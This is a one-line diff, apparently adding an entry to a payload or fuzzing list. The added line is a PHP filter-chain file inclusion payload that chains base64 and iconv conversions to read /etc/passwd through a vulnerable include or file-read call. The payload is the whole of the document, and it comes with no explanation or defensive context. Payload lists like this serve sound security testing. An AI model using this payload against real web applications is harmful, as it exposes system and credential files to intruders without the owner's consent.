@@ -1,0 +1,1 @@
+php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource=/etc/passwd
